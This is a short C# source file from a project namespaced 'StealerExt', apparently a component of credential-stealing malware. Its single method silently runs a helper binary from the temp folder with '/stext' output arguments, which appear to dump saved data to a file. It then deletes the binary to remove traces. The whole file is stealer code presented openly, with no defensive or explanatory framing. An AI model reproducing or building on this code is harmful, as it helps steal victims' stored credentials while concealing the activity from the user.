using System.Diagnostics;
using System.IO;

namespace StealerExt
{
    internal class StartProcess
    {
        /// <summary>
        /// Start a process silently and wait for exit.
        /// </summary>
        /// <param name="BaseProgram">Name of binary including extension</param>
        /// <param name="FileName">FileSave Path</param>
        public static void Run(string BaseProgram, string FileName)
        {
			var cli = new Process()
			{
				StartInfo = new ProcessStartInfo($"{BaseProgram}", $"/C /stext \"{FileName}\"")
				{
					UseShellExecute = true,
					WorkingDirectory = Path.GetTempPath(),
					CreateNoWindow = true
				}
			};
			cli.Start();
			cli.WaitForExit();
			cli.Close();
			File.Delete(Path.Combine(API.Temp, BaseProgram));
		}
    }
}
